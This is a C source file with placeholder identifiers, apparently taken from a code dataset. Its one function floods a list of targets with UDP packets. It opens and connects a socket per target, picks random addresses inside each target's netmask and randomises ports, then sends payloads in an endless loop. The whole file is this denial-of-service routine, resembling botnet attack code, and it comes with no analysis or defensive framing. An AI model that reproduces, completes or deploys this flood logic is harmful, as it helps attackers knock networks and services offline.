
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_6__ TYPE_3__ ;
typedef struct TYPE_5__ TYPE_2__ ;
typedef struct TYPE_4__ TYPE_1__ ;


typedef int uint8_t ;
typedef int uint32_t ;
typedef void* uint16_t ;
struct udphdr {int dummy; } ;
struct TYPE_4__ {scalar_t__ s_addr; } ;
struct sockaddr_in {int sin_port; TYPE_1__ sin_addr; int sin_family; int member_0; } ;
struct sockaddr {int dummy; } ;
struct iphdr {int dummy; } ;
struct TYPE_5__ {int s_addr; } ;
struct TYPE_6__ {TYPE_2__ sin_addr; void* sin_port; } ;
struct attack_target {int netmask; TYPE_3__ sock_addr; int addr; } ;
struct attack_option {int dummy; } ;
typedef int port_t ;
typedef void* BOOL ;


 int VAR_0 ;
 int VAR_1 ;
 int VAR_2 ;
 int VAR_3 ;
 int VAR_4 ;
 int VAR_5 ;
 int VAR_6 ;
 int VAR_7 ;
 int VAR_8 ;
 void* FUNC_0 (int,struct attack_option*,int ,int) ;
 int FUNC_1 (int,struct sockaddr*,int) ;
 void* FUNC_2 (int,int) ;
 int FUNC_3 (int,struct sockaddr*,int) ;
 int VAR_9 ;
 int FUNC_4 (scalar_t__) ;
 void* FUNC_5 (int) ;
 scalar_t__ FUNC_6 (int ) ;
 int FUNC_7 (char*,...) ;
 void* FUNC_8 () ;
 int FUNC_9 (char*,void*) ;
 int FUNC_10 (int,char*,void*,int ) ;
 int FUNC_11 (int ,int ,int ) ;

void FUNC_12(uint8_t VAR_10, struct attack_target *VAR_11, uint8_t VAR_12, struct attack_option *VAR_13)
{




    int VAR_14;
    char **VAR_15 = FUNC_2(VAR_10, sizeof (char *));
    int *VAR_16 = FUNC_2(VAR_10, sizeof (int));
    port_t VAR_17 = FUNC_0(VAR_12, VAR_13, VAR_1, 0xffff);
    port_t VAR_18 = FUNC_0(VAR_12, VAR_13, VAR_4, 0xffff);
    uint16_t VAR_19 = FUNC_0(VAR_12, VAR_13, VAR_3, 512);
    BOOL VAR_20 = FUNC_0(VAR_12, VAR_13, VAR_2, VAR_8);
    struct sockaddr_in VAR_21 = {0};

    if (VAR_18 == 0xffff)
    {
        VAR_18 = FUNC_8();
    } else {
        VAR_18 = FUNC_5(VAR_18);
    }





    for (VAR_14 = 0; VAR_14 < VAR_10; VAR_14++)
    {
        struct iphdr *VAR_22;
        struct udphdr *VAR_23;
        char *VAR_24;

        VAR_15[VAR_14] = FUNC_2(65535, sizeof (char));

        if (VAR_17 == 0xffff)
            VAR_11[VAR_14].sock_addr.sin_port = FUNC_8();
        else
            VAR_11[VAR_14].sock_addr.sin_port = FUNC_5(VAR_17);

        if ((VAR_16[VAR_14] = FUNC_11(VAR_0, VAR_7, VAR_5)) == -1)
        {



            return;
        }

        VAR_21.sin_family = VAR_0;
        VAR_21.sin_port = VAR_18;
        VAR_21.sin_addr.s_addr = 0;

        if (FUNC_1(VAR_16[VAR_14], (struct sockaddr *)&VAR_21, sizeof (struct sockaddr_in)) == -1)
        {



        }


        if (VAR_11[VAR_14].netmask < 32)
            VAR_11[VAR_14].sock_addr.sin_addr.s_addr = FUNC_4(FUNC_6(VAR_11[VAR_14].addr) + (((uint32_t)FUNC_8()) >> VAR_11[VAR_14].netmask));

        if (FUNC_3(VAR_16[VAR_14], (struct sockaddr *)&VAR_11[VAR_14].sock_addr, sizeof (struct sockaddr_in)) == -1)
        {



        }
    }





    while (VAR_8)
    {
        for (VAR_14 = 0; VAR_14 < VAR_10; VAR_14++)
        {
            char *VAR_25 = VAR_15[VAR_14];


            if (VAR_20)
                FUNC_9(VAR_25, VAR_19);
            FUNC_10(VAR_16[VAR_14], VAR_25, VAR_19, VAR_6);

        }





    }
}
